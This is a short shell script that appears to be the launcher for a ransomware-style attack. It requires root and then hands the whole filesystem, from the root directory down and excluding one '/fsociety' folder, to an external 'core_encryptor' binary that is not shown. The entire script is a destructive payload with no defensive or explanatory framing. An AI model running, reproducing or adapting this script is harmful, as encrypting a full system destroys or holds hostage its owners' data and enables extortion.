#! /usr/bin/sh

if [ "$EUID" -ne 0 ]; then
  echo "[!] Permission denied: required root privilege."
  exit 1
fi

TARGET_DIR="/"
EXCLUDE_DIR="/fsociety"
ENCRYPTOR_BIN="./tools/core_encryptor"

if [ ! -f "$ENCRYPTOR_BIN" ]; then
  echo "[!] Error: Couldn't find ($ENCRYPTOR_BIN)!"
  exit 1
fi

echo "[*] Encrypting..."

"$ENCRYPTOR_BIN" "$TARGET_DIR" "$EXCLUDE_DIR"

echo "[+] Encrypted."
